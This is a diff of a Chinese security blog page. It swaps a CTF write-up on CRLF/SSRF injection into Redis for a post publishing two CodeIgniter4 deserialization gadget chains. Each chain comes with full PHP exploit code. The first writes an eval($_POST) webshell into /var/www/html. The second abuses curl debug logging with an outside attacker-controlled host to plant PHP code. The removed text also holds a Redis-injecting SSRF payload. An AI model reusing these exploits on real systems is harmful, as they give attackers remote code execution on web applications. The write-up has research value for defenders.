@@ -9,14 +9,14 @@
   <meta name="keywords" content="">
   <meta name="description" content="">
   <meta name="author" content="kveln">
-  <title>[SWPUCTF 2016]Web7(CRLF+SSRF) |  </title>
+  <title>codeIgniter4的两个写文件链子 |  </title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
   <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
   <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="[SWPUCTF 2016]Web7(CRLF+SSRF) |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="codeIgniter4的两个写文件链子 |   » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
   <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
@@ -25,8 +25,8 @@
   <script>hljs.initHighlightingOnLoad();</script>
   
 
-    <meta property="og:description" content="[SWPUCTF 2016]Web7(CRLF+SSRF)"/>
-    <meta property="og:url" content="https://guokeya.github.io/post/swpuctf-2016web7urllib-tou-zhu-ru-ssrf/"/>
+    <meta property="og:description" content="codeIgniter4的两个写文件链子"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/lQXYmp8_4/"/>
     <meta property="og:locale" content="zh-CN"/>
     <meta property="og:type" content="website"/>
     <meta property="og:site_name" content=" "/>
@@ -82,13 +82,11 @@
           	 
             <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
             
-            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
-            
         </span>
-            <h1>[SWPUCTF 2016]Web7(CRLF+SSRF)</h1>
+            <h1>codeIgniter4的两个写文件链子</h1>
             <span class="meta">
             	Posted on
-              2020-02-10，2 min read
+              2021-08-25，4 min read
             </span>
           </div>
         </div>
@@ -101,46 +99,167 @@
     <div class="container">
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
-          <p>首先。题目就一个input和login<br>
-login需要admin密码<br>
-先从input开始<br>
-随手输了个123报错了。</p>
-<!-- more -->
-<p><img src="https://guokeya.github.io/post-images/1581339363522.png" alt="" loading="lazy"><br>
-得到信息如下。<br>
-<code>Powered by CherryPy 17.4.2</code><br>
-<code>调用了urllib2.open</code><br>
-通过百度。我们得到了python urllib头注入<br>
-<strong>漏洞复现</strong><br>
-这是16年的洞了。unbantu上复现了下失败。<br>
-在Centos5上python2.4复现成功😂(版本老的好处)</p>
-<pre><code>import urllib2
-import sys
-url=sys.argv[1]
-result=urllib2.urlopen(url)
-print result.read()
-#通过命令行传参
+          <h1 id="前言">前言</h1>
+<p>蓝帽杯打完了。该公开链子了<br>
+也不懂为啥。最近很多人把单独的链子当0day各种*。暂且不谈算不算0day。<br>
+链子不应该是配合反序列化漏洞点才算漏洞嘛？？？为啥单独成洞了，没漏洞点能干嘛😅<br>
+整的和挖了个框架无条件RCE一样。</p>
+<p>第一条写文件链子：<br>
+触发点，调用任意类的close方法<br>
+<img src="https://guokeya.github.io/post-images/1629895969691.png" alt="" loading="lazy"><br>
+懒得说啥类的close方法。你们慢慢调。<br>
+使redis类报错。进入catch调用任意类的error方法<br>
+<img src="https://guokeya.github.io/post-images/1629896008554.png" alt="" loading="lazy"><br>
+接着log方法<br>
+<img src="https://guokeya.github.io/post-images/1629896167350.png" alt="" loading="lazy"><br>
+然后是个抽象方法。找个具体实现方法</p>
+<pre><code>abstract public function log($level, $message, array $context = []);
 </code></pre>
-<p><img src="https://guokeya.github.io/post-images/1581339737228.png" alt="" loading="lazy"><br>
-漏洞原理是urllib在解析url时。接受URL编码的值。会包含在HTTP数据流中。<br>
-那么我们就可以通过%0d%0a去构造一个新的HTTP请求<br>
-<img src="https://guokeya.github.io/post-images/1581340098855.png" alt="" loading="lazy"><br>
-以上实验。我们开了一个80端口和8080端口<br>
-然后通过构造请求。成功访问到8080端口<br>
-同理。既然我们能访问到8080。那么是否就能攻击Redis。内网这些薄弱的应用<br>
-继续我们的CTF题解<br>
-之前说login页面需要密码才能登陆。这题其实。就是通过urllib注入redis。修改admin密码<br>
-<code>http://127.0.0.1%0d%0a%0d%0aset%20admin%20admin%0d%0aHost:%20127.0.0.1:6379</code><br>
-<img src="https://guokeya.github.io/post-images/1581388396549.png" alt="" loading="lazy"><br>
-也可以直接写:6379不用指定Host头<br>
-靶机上。写了脚本定时修改redis数据。发完payload立马用admin登陆。即可<br>
-<img src="https://guokeya.github.io/post-images/1581388446393.png" alt="" loading="lazy"></p>
+<p>最后找到<br>
+<img src="https://guokeya.github.io/post-images/1629896273766.png" alt="" loading="lazy"><br>
+前面一堆判断。都可以控制。重点在最后<br>
+<code>$handler</code>可控，调用setDateFormat。并且参数可控，setDateFormat方法就是返回当前对象。然后调用当前对象的handle方法。说白了。就是调用<code>$handler</code>的handle方法</p>
+<pre><code>$handler = $this-&gt;handlers[$className];
+
+if (!$handler-&gt;canHandle($level)) {
+    continue;
+}
+
+
+if (!$handler-&gt;setDateFormat($this-&gt;dateFormat)-&gt;handle($level, $message)) {
+    break;
+}
+</code></pre>
+<p>最后找到了可写的点，date。当时XCTF有个题。date的注入。。用\转义字符就行。至于fileExtension为php就会添加exit。反正fileExtension都是拼接到文件路径。变个1.php拼接完就成了xxx.1.php。问题不大<br>
+<img src="https://guokeya.github.io/post-images/1629896509778.png" alt="" loading="lazy"></p>
+<p>EXP:</p>
+<pre><code>&lt;?php
+namespace CodeIgniter\Cache\Handlers{
+    class RedisHandler{
+        protected $redis;
+        public function __construct($redis){
+            $this-&gt;redis=$redis;
+        }
+    }
+}
+namespace CodeIgniter\Log{
+	class Logger{
+		protected $dateFormat = '\&lt;\?\p\h\p\ \e\v\a\l\(\$\_\P\O\S\T\[\&quot;\g\u\o\k\e\&quot;\]\)\;\?\&gt;';
+		protected $loggableLevels = ['error','critical'];
+		protected $handlerConfig;
+		public function __construct($handlerConfig,$handlers){
+			$this-&gt;handlerConfig=$handlerConfig;
+			$this-&gt;handlers=$handlers;
+	
+		}
+	}
+}
+namespace CodeIgniter\Log\Handlers{
+	class FileHandler{
+		protected $path='/var/www/html/';
+		protected $filePermissions=0777;
+		protected $fileExtension='1/../b.php';
+		protected $handles=['error'];
+	}
+}
+namespace CodeIgniter\Session\Handlers{
+    class RedisHandler{
+        protected $redis;
+		protected $logger;
+        public function __construct($logger){
+            $this-&gt;redis=new \Redis();
+			$this-&gt;logger=$logger;
+        }
+    }
+}
+namespace{
+	use CodeIgniter\Log\Handlers\FileHandler;
+	use CodeIgniter\Log\Logger;
+    use CodeIgniter\Session\Handlers\RedisHandler as RedisHandler2;
+    use CodeIgniter\Cache\Handlers\RedisHandler as RedisHandler1;
+	$FileHandler=new FileHandler();
+	$Logger=new Logger(['a'=&gt;'b'],['a'=&gt;$FileHandler]);
+    $RedisHandler2=new RedisHandler2($Logger);
+    $RedisHandler1=new RedisHandler1($RedisHandler2);
+    echo urlencode(serialize($RedisHandler1));
+}
+</code></pre>
+<p>第二条写文件链子：<br>
+同样的起点<br>
+<img src="https://guokeya.github.io/post-images/1629896672413.png" alt="" loading="lazy"><br>
+调用任意delete方法。并且参数可控<br>
+<img src="https://guokeya.github.io/post-images/1629896701418.png" alt="" loading="lazy"><br>
+调用reqeust。参数可控<br>
+<img src="https://guokeya.github.io/post-images/1629896730561.png" alt="" loading="lazy"><br>
+具体看send方法<br>
+<img src="https://guokeya.github.io/post-images/1629896788195.png" alt="" loading="lazy"><br>
+设置了URL。并且setCURLOptions的参数可控<br>
+<img src="https://guokeya.github.io/post-images/1629896805420.png" alt="" loading="lazy"><br>
+这里参数可控。其实就是指定了curl的日志为xxx.php。curl访问中的信息都会保存进去<br>
+<img src="https://guokeya.github.io/post-images/1629896869694.png" alt="" loading="lazy"></p>
+<p>EXP:</p>
+<pre><code>&lt;?php
+
+namespace CodeIgniter\HTTP {
+    class CURLRequest{
+        protected $config = [
+            'timeout'         =&gt; 1.0,
+            'connect_timeout' =&gt; 150,
+            'debug'           =&gt; &quot;Guoke.php&quot;,
+            'verify'          =&gt; true,
+        ];
+    }
+}
+
+namespace CodeIgniter\Session\Handlers {
+    class MemcachedHandler
+    {
+        public $lockKey = 'http://s.guokeya.top/2.php';
+        public $memcached;
+
+        public function __construct($memcached)
+        {
+            $this-&gt;memcached = $memcached;
+        }
+    }
+}
+
+namespace CodeIgniter\Cache\Handlers {
+    class RedisHandler
+    {
+        protected $redis;
+
+        public function __construct($redis)
+        {
+            $this-&gt;redis = $redis;
+        }
+    }
+}
+
+namespace {
+
+    use CodeIgniter\Cache\Handlers\RedisHandler;
+    use CodeIgniter\Session\Handlers\MemcachedHandler;
+    use CodeIgniter\HTTP\CURLRequest;
+    $CURLRequest = new CURLRequest();
+    $MemcachedHandler = new MemcachedHandler($CURLRequest);
+    $RedisHandler = new RedisHandler($MemcachedHandler);
+    echo urlencode(serialize($RedisHandler));
+}
+?&gt;
+
+</code></pre>
+<p>服务器放2.php</p>
+<pre><code>&lt;?php
+header('Set-Cookie: test=&lt;?php phpinfo();?&gt;');
+</code></pre>
+<p>当然还有其他链子。这里就分享两个</p>
 
           
           <p class="next-post">下一篇：
-            <a href="https://guokeya.github.io/post/harekazectf2019encode_and_encode/">
+            <a href="https://guokeya.github.io/post/LHcckATV-/">
               <span class="post-title">
-                [HarekazeCTF2019]encode_and_encode&rarr;
+                巅峰极客 eml管理系统&amp;&amp;一个python题&rarr;
               </span>
             </a>
           </p>
